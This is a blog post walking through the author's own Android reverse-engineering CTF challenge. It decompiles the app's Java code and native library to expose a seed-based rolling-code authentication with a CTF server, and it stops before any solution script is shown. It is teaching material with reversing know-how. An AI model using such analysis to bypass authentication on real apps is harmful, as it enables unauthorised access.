<!DOCTYPE html>
<html lang="en-us">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <meta http-equiv="cache-control" content="max-age=0" />
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
    <meta http-equiv="pragma" content="no-cache" />

    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"}>
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">

    <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff" />
    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1b" />

    <meta name="description" content="The Andro Experiment">

    
        <title>The Andro Experiment | chasek blog</title>
    

    
    <style>
        :root {
          --background: #ffffff;
        }
        @media (prefers-color-scheme: dark) {
          :root {
            --background: #1b1b1b;
          }
        }
        html {
            background-color: var(--background);
        }
        body {
            background-color: var(--background);
        }
    </style>

    
    <link rel="stylesheet" type="text/css" href="/style.min.a9de976a7573ba1b8227e403bbfab145eef224a3b71a621553428985cf42623c.css" media="all">

    
    

  </head>

  <body>
        
        <nav>
          <ul class="menu">
            
                <li><a tabindex="-1" class="menu-link" href="/"><u>H</u>ome</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="https://chasekillorin.com/tags"><u>T</u>ags</a></li>
            
          </ul>
        </nav>
        




<div id="single-header">
  <h1>
    The Andro Experiment
  </h1>
  <div id="single-meta">
    
        <p id="subtitle">Android Reversing CTF Challenge</p>
    
    
        <span class="datesub">May 21, 2024</span>
      
<span id="tags">
  &nbsp;&nbsp;
   <span>
    <a href="http://localhost:1313/tags/android/">#android</a>
  </span>&nbsp; <span>
    <a href="http://localhost:1313/tags/ctf/">#ctf</a>
  </span>&nbsp; <span>
    <a href="http://localhost:1313/tags/reverse-engineering/">#reverse-engineering</a>
  </span>&nbsp;</span>


  </div>
</div>





<main><h1 id="the-andro-experiment">The Andro Experiment</h1>
<p>Hello! I made this Android RE CTF challenge you can find <a href="https://github.com/chase1k/The_Andro_Experiment"  target="_blank" rel="noreferrer nofollow">here</a>
 on my github.</p>
<p>I highly suggest hosting the challenge and solving it yourself first, and/or following along with this.</p>
<p>So let&rsquo;s walk through the solution and thought process!</p>
<h2 id="what-is-happening">What is happening</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="l">Hey, it&#39;s Chase again.</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">I did some more research into some of the experiments Anthony was doing and found this website.</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">Something about an android application calling back to a server, so once again see if there is any information on the server about him?</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">https://the-andro-experiment.ctf.ritsec.club/ </span><span class="w">
</span></span></span></code></pre></div><p>To start you are told that you have an android app that is calling back to a server. You are then greeted with this website&hellip;</p>
<blockquote>
<p><a href="http://the-andro-experiment.ctf.ritsec.club"  target="_blank" rel="noreferrer nofollow">http://the-andro-experiment.ctf.ritsec.club</a>
</p></blockquote>
<p><p class="imgp">
  <img loading="lazy" src="/img/in-post/the_andro_experiment/img0.png" alt="img0"  />
</p>
</p>
<p>From either of the download links you can download <code>Andro.apk</code>. There is also, the <code>ping</code> link on the navbar that doesn&rsquo;t actually increment the <code>App Ping Number</code>.</p>
<p>This number not incrementing by the website is a hint towards something the app is doing that allows that number to increment.</p>
<h2 id="what-youre-supposed-to-do">What you&rsquo;re supposed to do</h2>
<h3 id="running-the-app"><code>Running The App</code></h3>
<p>Right off the bat I would throw this in an emulator or push it onto an actual device if you have one.</p>
<blockquote>
<p>I&rsquo;m using the Android Studio Emulator on a <code>Pixel_3a_API_34_extension_level_7_x86_64</code></p></blockquote>
<p>This challenge can be done with static reversing, but detonating someone random&rsquo;s &ldquo;CTF Challenge&rdquo; is always a good idea to gain more information.</p>
<p>When you first run the app you are greeted with this&hellip;</p>
<p><p class="imgp">
  <img loading="lazy" src="/img/in-post/the_andro_experiment/img1.png" alt="img1"  />
</p>
</p>
<p>The first thought is a free flag in base64 but when you decode it you get</p>
<p><code>“There is no real ending. It’s just the place where you stop the story.” ― Frank Herbert</code></p>
<p>&hellip;this is just a Dune quote</p>
<p>What&rsquo;s important is the <code>Server Authenticated</code> toast that popped up, and the <code>Ping Server</code> button visible.</p>
<p>When the <code>Ping Server</code> button is clicked you get this back&hellip;</p>
<p><p class="imgp">
  <img loading="lazy" src="/img/in-post/the_andro_experiment/img1.5.png" alt="img1.5"  />
</p>
</p>
<p>The ping worked!</p>
<p>You may receive an error message when running this or starting the app, if so, the server is most likely down.</p>
<p>This is all the real functionality of the app, but this will give context to the functionality of the app we see later.</p>
<h3 id="reversing-the-app"><code>Reversing The App</code></h3>
<p>Opening <code>Andro.apk</code> in <a href="https://github.com/skylot/jadx"  target="_blank" rel="noreferrer nofollow">Jadx</a>
 shows us a lot&hellip;</p>
<p><p class="imgp">
  <img loading="lazy" src="/img/in-post/the_andro_experiment/img2.png" alt="img2"  />
</p>
</p>
<p>These in the MainActivity are important:</p>
<ul>
<li>
<p><code>seed</code> - seed value variable used in server authentication</p>
</li>
<li>
<p><code>generateSeed()</code> function to generate the seed value</p>
</li>
<li>
<p><code>performGetRequest()</code> function for sending a GET request to the server</p>
</li>
<li>
<p><code>rollCode()</code> function for reauthing with the server every request</p>
</li>
<li>
<p><code>sendBytesToServer()</code> function for sending data to the server</p>
</li>
</ul>
<p>Heads up these function names arent entirely indicative of what the function actually does, so let&rsquo;s see what they do below.</p>
<p>In the main activity, we see&hellip;</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">MainActivity</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">AppCompatActivity</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">static</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">seed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ExecutorService</span><span class="w"> </span><span class="n">executor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Executors</span><span class="p">.</span><span class="na">newFixedThreadPool</span><span class="p">(</span><span class="n">10</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">native</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="nf">generateSeed</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">native</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="nf">rollCode</span><span class="p">(</span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">bArr</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="cm">/* JADX INFO: Access modifiers changed from: protected */</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w"> </span><span class="c1">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">onCreate</span><span class="p">(</span><span class="n">Bundle</span><span class="w"> </span><span class="n">savedInstanceState</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">super</span><span class="p">.</span><span class="na">onCreate</span><span class="p">(</span><span class="n">savedInstanceState</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setContentView</span><span class="p">(</span><span class="n">C0570R</span><span class="p">.</span><span class="na">layout</span><span class="p">.</span><span class="na">activity_main</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">loadLibrary</span><span class="p">(</span><span class="s">&#34;andro&#34;</span><span class="p">);</span><span class="w"> </span><span class="c1">// &lt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">loadLibrary</span><span class="p">(</span><span class="s">&#34;ssl&#34;</span><span class="p">);</span><span class="w"> </span><span class="c1">// &lt;-- These 3 lines</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">loadLibrary</span><span class="p">(</span><span class="s">&#34;crypto&#34;</span><span class="p">);</span><span class="w"> </span><span class="c1">// &lt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">seed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">generateSeed</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">performGetRequest</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Button</span><span class="w"> </span><span class="n">myButton</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Button</span><span class="p">)</span><span class="w"> </span><span class="n">findViewById</span><span class="p">(</span><span class="n">C0570R</span><span class="p">.</span><span class="na">C0573id</span><span class="p">.</span><span class="na">button</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">myButton</span><span class="p">.</span><span class="na">setOnClickListener</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">View</span><span class="p">.</span><span class="na">OnClickListener</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">// from class: com.example.andro.MainActivity.1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="nd">@Override</span><span class="w"> </span><span class="c1">// android.view.View.OnClickListener</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">onClick</span><span class="p">(</span><span class="n">View</span><span class="w"> </span><span class="n">v</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Log</span><span class="p">.</span><span class="na">d</span><span class="p">(</span><span class="s">&#34;rollcode&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;OnClick&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">Arrays</span><span class="p">.</span><span class="na">toString</span><span class="p">(</span><span class="n">MainActivity</span><span class="p">.</span><span class="na">seed</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">MainActivity</span><span class="p">.</span><span class="na">seed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MainActivity</span><span class="p">.</span><span class="na">this</span><span class="p">.</span><span class="na">rollCode</span><span class="p">(</span><span class="n">MainActivity</span><span class="p">.</span><span class="na">seed</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">MainActivity</span><span class="p">.</span><span class="na">this</span><span class="p">.</span><span class="na">sendBytesToServer</span><span class="p">(</span><span class="n">MainActivity</span><span class="p">.</span><span class="na">seed</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>You can see on the lines starting with <code>System.loadLibrary</code>.</p>
<p>There are some native libraries being imported, these contain the native functions referenced later.</p>
<p>Otherwise, on start, we generate our seed with <code>generateSeed()</code> and then run <code>performGetRequest()</code>.</p>
<p>Then we simply wait for the button to be clicked. If clicked, the seed value is logged, then we run the <code>rollcode()</code> function using that original seed. Then that seed is sent to the server with <code>sendBytesToServer()</code>.</p>
<h4 id="performgetrequest"><code>performGetRequest()</code></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">performGetRequest</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[</span><span class="s">&#34;SEED:&#34;</span><span class="p">.</span><span class="na">length</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">4</span><span class="o">]</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="s">&#34;SEED:&#34;</span><span class="p">.</span><span class="na">length</span><span class="p">();</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">result</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;SEED:&#34;</span><span class="p">.</span><span class="na">getBytes</span><span class="p">()</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">i2</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">seed</span><span class="p">.</span><span class="na">length</span><span class="p">;</span><span class="w"> </span><span class="n">i2</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">result</span><span class="o">[</span><span class="s">&#34;SEED:&#34;</span><span class="p">.</span><span class="na">length</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">i2</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">seed</span><span class="o">[</span><span class="n">i2</span><span class="o">]</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">sendBytesToServer</span><span class="p">(</span><span class="n">result</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>This function sends the seed, with the prefix of <code>SEED:</code> to the <code>sendBytesToServer()</code> function.</p>
<p>All the loops just convert the strings to bytes, otherwise, let&rsquo;s see what happens to the result after it&rsquo;s sent.</p>
<h4 id="sendbytestoserver"><code>sendBytesToServer()</code></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">sendBytesToServer</span><span class="p">(</span><span class="kd">final</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">code</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">executor</span><span class="p">.</span><span class="na">execute</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Runnable</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">// from class: com.example.andro.MainActivity.2</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="nd">@Override</span><span class="w"> </span><span class="c1">// java.lang.Runnable</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">run</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">MediaType</span><span class="w"> </span><span class="n">RAW</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MediaType</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&#34;application/octet-stream&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">OkHttpClient</span><span class="w"> </span><span class="n">client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">OkHttpClient</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">RequestBody</span><span class="w"> </span><span class="n">body</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">RequestBody</span><span class="p">.</span><span class="na">create</span><span class="p">(</span><span class="n">code</span><span class="p">,</span><span class="w"> </span><span class="n">RAW</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Request</span><span class="w"> </span><span class="n">request</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Request</span><span class="p">.</span><span class="na">Builder</span><span class="p">().</span><span class="na">url</span><span class="p">(</span><span class="s">&#34;http://the-andro-experiment.ctf.ritsec.club/ping&#34;</span><span class="p">).</span><span class="na">post</span><span class="p">(</span><span class="n">body</span><span class="p">).</span><span class="na">build</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">Response</span><span class="w"> </span><span class="n">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">client</span><span class="p">.</span><span class="na">newCall</span><span class="p">(</span><span class="n">request</span><span class="p">).</span><span class="na">execute</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">MainActivity</span><span class="p">.</span><span class="na">this</span><span class="p">.</span><span class="na">runOnUiThread</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Runnable</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">// from class: com.example.andro.MainActivity.2.1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="nd">@Override</span><span class="w"> </span><span class="c1">// java.lang.Runnable</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">run</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">code</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">83</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                                </span><span class="n">Toast</span><span class="p">.</span><span class="na">makeText</span><span class="p">(</span><span class="n">MainActivity</span><span class="p">.</span><span class="na">this</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Ping Sent&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">).</span><span class="na">show</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                                </span><span class="n">Toast</span><span class="p">.</span><span class="na">makeText</span><span class="p">(</span><span class="n">MainActivity</span><span class="p">.</span><span class="na">this</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Server Authenticated&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">).</span><span class="na">show</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">response</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">response</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">Log</span><span class="p">.</span><span class="na">d</span><span class="p">(</span><span class="s">&#34;MainErr&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">e</span><span class="p">.</span><span class="na">toString</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">MainActivity</span><span class="p">.</span><span class="na">this</span><span class="p">.</span><span class="na">runOnUiThread</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Runnable</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">// from class: com.example.andro.MainActivity.2.2</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="nd">@Override</span><span class="w"> </span><span class="c1">// java.lang.Runnable</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">run</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">Toast</span><span class="p">.</span><span class="na">makeText</span><span class="p">(</span><span class="n">MainActivity</span><span class="p">.</span><span class="na">this</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Could Not Send&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">).</span><span class="na">show</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>Going top down, we can see that the functions deals with some threading with Runnables.</p>
<p>This prepares the <code>OkHTTPClient</code> for the request we&rsquo;re sending. In the body we send the <code>code</code>(seed) that was generated before in the body. The request is sent to the website from before, but at <code>/ping</code>.</p>
<blockquote>
<p><a href="http://the-andro-experiment.ctf.ritsec.club/ping"  target="_blank" rel="noreferrer nofollow">http://the-andro-experiment.ctf.ritsec.club/ping</a>
</p></blockquote>
<p>If you remember from before pinging the server on the website didn&rsquo;t work, but pinging it from the app did. This is because of OkHTTP we&rsquo;ll see that later too.</p>
<p>We then try running it. If successful we make the toast with <code>Ping Sent</code>. Unless the first bytes of code is <code>83</code> (which is the letter <code>S</code>). Then, we toast <code>Server Authenticated</code>.</p>
<p>If this was the <code>seed</code> from <code>performGetRequest</code> it means we authenticated. It is simply checking if we prefixes the seed with <code>SEED:</code>.</p>
<p>Both we saw before when we ran the app.</p>
<p>Otherwise, we catch any errors and clean up.</p>
<h3 id="reversing-the-library"><code>Reversing the Library</code></h3>
<p>If you remember the app imported some libraries and got the functions <code>generateSeed()</code> and <code>rollCode()</code> within the Java part of the app. Let&rsquo;s dig into those.</p>
<p>First, we have to open up the apk which contains other files inside (similar to a .zip) using <a href="https://apktool.org/"  target="_blank" rel="noreferrer nofollow">apktool</a>
.</p>
<p>Running this on the apk will give us access to the libraries inside.</p>
<blockquote>
<p>$ apktool d Andro.apk -f</p></blockquote>
<p>Now we have these&hellip;</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ ls Andro/lib/x86_64
</span></span><span class="line"><span class="cl">libandro.so  libcrypto.so  libssl.so
</span></span></code></pre></div><p>The libraries <code>libcrypto</code> and <code>libssl</code> aren&rsquo;t important for us here. The one with the challenge&rsquo;s namesake <code>libandro</code> is it.</p>
<p>Opening up <code>libandro</code> in <a href="https://binary.ninja/free/"  target="_blank" rel="noreferrer nofollow">Binary Ninja</a>
 we can see the functions on the left side, clicking on the ones we saw in jadx may return this&hellip;</p>
<p><p class="imgp">
  <img loading="lazy" src="/img/in-post/the_andro_experiment/img3.png" alt="img3"  />
</p>
</p>
<p>A lot of terrible JNI functions, these aren&rsquo;t important for the function implementation they&rsquo;re just for using them within the Java.</p>
<p>The actual implementation is usually right next to it.</p>
<p>Using <code>Pseudo C</code> the <code>generateSeed()</code> function looks like this&hellip;</p>
<p><p class="imgp">
  <img loading="lazy" src="/img/in-post/the_andro_experiment/img4.png" alt="img4"  />
</p>
</p>
<p>As you can see when we generate the seed, we&rsquo;re actually just taking 4 bytes from <code>/dev/urandom</code>.</p>
<p>Inside of the <code>rollCode()</code> function, we see this&hellip;</p>
<p><p class="imgp">
  <img loading="lazy" src="/img/in-post/the_andro_experiment/img5.png" alt="img5"  />
</p>
</p>
<p>It is a simple <code>SHA256</code> hash every times using that crypto library.</p>
<p>Referencing the Java code earlier&hellip;</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">onClick</span><span class="p">(</span><span class="n">View</span><span class="w"> </span><span class="n">v</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Log</span><span class="p">.</span><span class="na">d</span><span class="p">(</span><span class="s">&#34;rollcode&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;OnClick&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">Arrays</span><span class="p">.</span><span class="na">toString</span><span class="p">(</span><span class="n">MainActivity</span><span class="p">.</span><span class="na">seed</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">MainActivity</span><span class="p">.</span><span class="na">seed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MainActivity</span><span class="p">.</span><span class="na">this</span><span class="p">.</span><span class="na">rollCode</span><span class="p">(</span><span class="n">MainActivity</span><span class="p">.</span><span class="na">seed</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">MainActivity</span><span class="p">.</span><span class="na">this</span><span class="p">.</span><span class="na">sendBytesToServer</span><span class="p">(</span><span class="n">MainActivity</span><span class="p">.</span><span class="na">seed</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>It seems like there is a rolling code system that rolls the previous <code>code</code>/<code>seed</code> with the server every time it sends the next ping.</p>
<p>Finally, if you looked further in the library you would&rsquo;ve seen this piece of deprecated code&hellip;</p>
<p><p class="imgp">
  <img loading="lazy" src="/img/in-post/the_andro_experiment/img6.png" alt="img6"  />
</p>
</p>
<p>This tells us about this unimplemented <code>command_server()</code> function, which uses <code>/experiment</code>.</p>
